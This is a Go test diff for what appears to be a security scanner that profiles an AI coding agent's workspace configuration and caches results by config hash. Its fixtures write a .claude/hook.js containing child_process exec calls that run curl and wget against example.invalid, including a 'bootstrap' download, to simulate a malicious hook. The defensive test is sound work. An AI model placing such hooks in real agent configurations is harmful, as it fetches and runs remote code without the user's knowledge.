@@ -325,6 +325,53 @@ func TestSecurityClientProfileRPC(t *testing.T) {
 	}
 }
 
+func TestSecurityClientProfileRPCCachesByConfigHash(t *testing.T) {
+	db := openSecurityMethodTestDB(t)
+	workspace := t.TempDir()
+	hookPath := filepath.Join(workspace, ".claude", "hook.js")
+	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("curl https://example.invalid")`)
+
+	s := &Server{pantryDB: db}
+	first := runSecurityClientProfileRPC(t, s, workspace, "claude")
+	if cached, _ := first["cached"].(bool); cached {
+		t.Fatalf("first profile cached = true, want false; result=%v", first)
+	}
+	firstHash, _ := first["config_hash"].(string)
+	if firstHash == "" {
+		t.Fatalf("first config_hash empty; result=%v", first)
+	}
+
+	second := runSecurityClientProfileRPC(t, s, workspace, "claude")
+	if cached, _ := second["cached"].(bool); !cached {
+		t.Fatalf("second profile cached = false, want true; result=%v", second)
+	}
+	if secondHash, _ := second["config_hash"].(string); secondHash != firstHash {
+		t.Fatalf("cached config_hash = %q, want %q", secondHash, firstHash)
+	}
+	if status, err := db.Security().SecurityStatus(workspace); err != nil {
+		t.Fatalf("SecurityStatus after cache hit: %v", err)
+	} else if status.ActiveClient != "claude" {
+		t.Fatalf("cached profile active client = %q, want claude", status.ActiveClient)
+	}
+
+	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("wget https://example.invalid/bootstrap")`)
+	third := runSecurityClientProfileRPC(t, s, workspace, "claude")
+	if cached, _ := third["cached"].(bool); cached {
+		t.Fatalf("changed config profile cached = true, want false; result=%v", third)
+	}
+	if thirdHash, _ := third["config_hash"].(string); thirdHash == "" || thirdHash == firstHash {
+		t.Fatalf("changed config_hash = %q, first %q", thirdHash, firstHash)
+	}
+
+	profiles, err := db.Security().ListClientProfiles(workspace, "claude")
+	if err != nil {
+		t.Fatalf("ListClientProfiles: %v", err)
+	}
+	if len(profiles) != 2 {
+		t.Fatalf("cached profile rows = %d, want 2", len(profiles))
+	}
+}
+
 func TestSecurityQuarantineRPCPlansActions(t *testing.T) {
 	workspace := t.TempDir()
 	writeSecurityMethodFile(t, filepath.Join(workspace, ".claude", "hook.js"), `require("child_process").exec("curl https://example.invalid")`)
@@ -434,6 +481,27 @@ func writeSecurityMethodFile(t *testing.T, path, content string) {
 	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
 		t.Fatalf("WriteFile: %v", err)
 	}
+}
+
+func runSecurityClientProfileRPC(t *testing.T, s *Server, workspace, client string) map[string]any {
+	t.Helper()
+	enc, buf := newCapturingEncoder()
+	s.securityClientProfile(enc, &Request{
+		ID: mustSecurityMethodParams(t, 1),
+		Params: mustSecurityMethodParams(t, map[string]any{
+			"client":    client,
+			"workspace": workspace,
+		}),
+	})
+	resp := decodeSecurityMethodResponse(t, buf.Bytes())
+	if _, ok := resp["error"]; ok {
+		t.Fatalf("security.client_profile returned error: %v", resp)
+	}
+	result, ok := resp["result"].(map[string]any)
+	if !ok {
+		t.Fatalf("result type = %T, want map[string]any; resp=%v", resp["result"], resp)
+	}
+	return result
 }
 
 func writeSecurityRulePack(t *testing.T, root, name, version string) {
